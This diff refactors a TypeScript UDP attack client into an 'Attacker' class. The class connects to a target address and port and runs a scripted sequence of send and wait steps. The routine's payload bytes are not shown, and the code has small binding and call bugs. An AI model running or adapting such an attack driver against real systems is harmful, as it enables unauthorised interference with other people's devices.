@@ -60,84 +60,94 @@ const AttackRoutine: AttackStep[] = [
 		comment: "Send final package"
 	}
 ]
-
-
-function sendMessage(socket: any, message: number[]): Promise<any> {
-	return new Promise(done => {
-		socket.send(Buffer.from(message), done);
-	});
-}
-
-let currentWait: (msg: Buffer, rinfo: any) => Promise<void> = null;
-function waitForReply(socket: any, messageToWait: number[], timeout: number, intervalMessage?: number[]): Promise<boolean> {
-	let intv;
-	if (intervalMessage) {
-		intv = setInterval(sendMessage, 500, socket, intervalMessage);
+export class Attacker {
+	address: string;
+	port: number;
+	timeout: number;
+	socket: dgram.Socket;
+	currentWait: (msg: Buffer, rinfo: any) => void;
+	constructor(address: string, port: number, timeout: number) {
+		this.address = address;
+		this.port = port;
+		this.timeout = timeout;
+		this.currentWait = null;
 	}
-	return new Promise(done => {
-		currentWait = async (msg: Buffer, rinfo: any) => {
-			if (_.isEqual(msg.toJSON().data, messageToWait)) {
+	sendMessage(message: number[]): Promise<any> {
+		return new Promise(done => {
+			this.socket.send(Buffer.from(message), done);
+		});
+	}
+	waitForReply(messageToWait: number[], intervalMessage?: number[]): Promise<boolean> {
+		let intv: NodeJS.Timeout = null;
+		if (intervalMessage) {
+			intv = setInterval(this.sendMessage, 500, intervalMessage);
+		}
+		return new Promise(done => {
+			this.currentWait = (msg: Buffer, rinfo: any) => {
+				if (_.isEqual(msg.toJSON().data, messageToWait)) {
+					if (intv) {
+						clearInterval(intv);
+					}
+					this.currentWait = null;
+					done(true);
+				}
+			};
+			setTimeout(() => {
+				if (!this.currentWait) {
+					return;
+				}
 				if (intv) {
 					clearInterval(intv);
 				}
-				currentWait = null;
-				done(true);
+				this.currentWait = null;
+				done(false);
+			}, this.timeout);
+		});
+	}
+	async performStep(step: AttackStep): Promise<string> {
+		let err;
+		switch (step.type) {
+			case AttackType.Send: {
+				err = await this.sendMessage(step.message);
+				if (err) {
+					return `Failed to perform step ${step.comment}: ${err.toString}`;
+				}
+				break;
 			}
-		};
-		setTimeout(() => {
-			if (intv) {
-				clearInterval(intv);
+			case AttackType.Wait: {
+				if (!await this.waitForReply(step.message, step.intervalMessage)) {
+					return `Empty reply on step ${step.comment}.`;
+				}
+				break;
 			}
-			currentWait = null;
-			done(false);
-		}, timeout);
-	});
-}
-
-async function performStep(socket: any, step: AttackStep, timeout: number): Promise<string> {
-	let err;
-	switch (step.type) {
-		case AttackType.Send: {
-			err = await sendMessage(socket, step.message);
+			default: {
+				return "Unknown step";
+			}
+		}
+		return null;
+	}
+	async attack(): Promise<string> {
+		this.socket = dgram.createSocket("udp4");
+		let err: string = null;
+		let connectionError: any = await new Promise(done => {
+			this.socket.connect(this.port, this.address, done);
+		});
+		if (connectionError) {
+			this.socket.close();
+			return `Failed to connect: ${connectionError.toString()}`;
+		}
+		this.socket.on("message", (msg, rinfo) => {
+			if (this.currentWait) {
+				this.currentWait(msg, rinfo);
+			}
+		})
+		for (let step of AttackRoutine) {
+			err = await this.performStep(step);
 			if (err) {
-				return `Failed to perform step ${step.comment}: ${err.toString}`;
+				break;
 			}
-			break;
 		}
-		case AttackType.Wait: {
-			if (!await waitForReply(socket, step.message, timeout, step.intervalMessage)) {
-				return `Empty reply on step ${step.comment}.`;
-			}
-			break;
-		}
-		default: {
-			return "Unknown step";
-		}
+		this.socket.close();
+		return err;
 	}
-	return null;
-}
-
-export async function attack(address: string, port: number, timeout: number): Promise<string> {
-	const socket = dgram.createSocket("udp4");
-	let err: string = null;
-	let connectionError: any = await new Promise(done => {
-		socket.connect(port, address, done);
-	});
-	if (connectionError) {
-		socket.close();
-		return `Failed to connect: ${connectionError.toString()}`;
-	}
-	socket.on("message", async (msg, rinfo) => {
-		if (currentWait) {
-			currentWait(msg, rinfo);
-		}
-	})
-	for (let step of AttackRoutine) {
-		err = await performStep(socket, step, timeout);
-		if (err) {
-			break;
-		}
-	}
-	socket.close();
-	return err;
 }
